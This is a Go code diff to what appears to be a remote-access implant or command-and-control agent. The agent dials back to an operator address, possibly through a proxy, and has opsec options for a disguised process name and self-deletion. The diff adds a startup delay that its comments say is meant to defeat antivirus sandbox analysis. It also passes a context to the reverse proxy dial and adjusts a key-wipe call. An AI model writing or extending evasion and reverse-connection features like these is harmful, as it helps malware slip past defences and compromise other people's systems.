@@ -58,6 +58,9 @@ type Config struct {
 
 	// ReadOnly rejects all write operations at the agent level.
 	ReadOnly bool
+
+	// Delay is the startup delay before network activity (sandbox evasion).
+	Delay time.Duration
 }
 
 // Agent is the main agent orchestrator.
@@ -75,6 +78,18 @@ func New(cfg Config) *Agent {
 // It returns only when ctx is cancelled or a fatal error occurs.
 func (a *Agent) Run(ctx context.Context) error {
 	initOpsec(a.cfg.ProcName, a.cfg.SelfDelete)
+
+	// Startup delay — sleep before any network activity to defeat AV sandbox
+	// analysis (most sandboxes timeout after 30-60 seconds).
+	if a.cfg.Delay > 0 {
+		t := time.NewTimer(a.cfg.Delay)
+		select {
+		case <-ctx.Done():
+			t.Stop()
+			return ctx.Err()
+		case <-t.C:
+		}
+	}
 
 	a.jail = NewPathJail(a.cfg.Root, a.cfg.Excludes)
 
@@ -159,7 +174,11 @@ func (a *Agent) serveConn(ctx context.Context, conn *transport.FramedConn) error
 		for i := range a.cfg.PSK {
 			a.cfg.PSK[i] = 0
 		}
-		runtime.KeepAlive(&a.cfg.PSK)
+		// KeepAlive on the slice header (not its address) ensures the
+		// backing array isn't collected before zeroing completes.
+		// Note: the GC may have already copied the original bytes
+		// during compaction; this is a best-effort wipe.
+		runtime.KeepAlive(a.cfg.PSK)
 	}
 
 	mux := transport.NewServerMux(conn, a.handleRequest)
@@ -201,7 +220,7 @@ func (a *Agent) dialReverse(ctx context.Context) (*transport.FramedConn, error) 
 	var err error
 
 	if a.cfg.ProxyAddr != "" {
-		rawConn, err = transport.DialViaProxy(a.cfg.ProxyAddr, a.cfg.Address, a.cfg.ProxyUser, a.cfg.ProxyPass)
+		rawConn, err = transport.DialViaProxy(ctx, a.cfg.ProxyAddr, a.cfg.Address, a.cfg.ProxyUser, a.cfg.ProxyPass)
 		if err != nil {
 			return nil, fmt.Errorf("proxy dial: %w", err)
 		}
